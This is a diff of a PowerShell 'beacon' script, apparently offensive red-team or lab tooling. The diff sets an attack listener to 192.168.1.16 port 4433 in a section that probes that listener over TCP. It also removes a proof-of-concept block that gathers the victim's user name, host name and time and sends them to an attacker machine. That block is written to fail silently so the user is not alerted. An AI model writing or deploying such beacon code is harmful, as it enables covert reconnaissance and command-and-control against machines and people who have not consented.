@@ -1,6 +1,6 @@
 # --- 02.A.CL0CKK33PER Smart Beacon ---
-$IP = "192.168.1.X"
-$Port = "4444"
+$IP = "192.168.1.16"
+$Port = "4433"
 
 # 1. Probe the Listener (TCP Port Check)
 $Socket = New-Object Net.Sockets.TcpClient
@@ -34,28 +34,3 @@ if($Wait) {
 
 # 3. Clean up and Exit
 $Socket.Close()
-
-# --- 02.B.CL0CKK33PER Beacon PoC ---
-
-$AttackBoxIP = "192.168.1.X" # Change to your IP
-$Port = "4444"
-
-# 1. Gather Basic Recon Data
-$User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$CompName = $env:COMPUTERNAME
-$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-
-# 2. Format the Beacon Message
-$Message = "BEACON: $Timestamp | Host: $CompName | User: $User"
-
-# 3. Send the beacon via TCP
-try {
-    $Client = New-Object System.Net.Sockets.TcpClient($AttackBoxIP, $Port)
-    $Stream = $Client.GetStream()
-    $Writer = New-Object System.IO.StreamWriter($Stream)
-    $Writer.WriteLine($Message)
-    $Writer.Flush()
-    $Client.Close()
-} catch {
-    # Fail silently to avoid alerting the user
-}
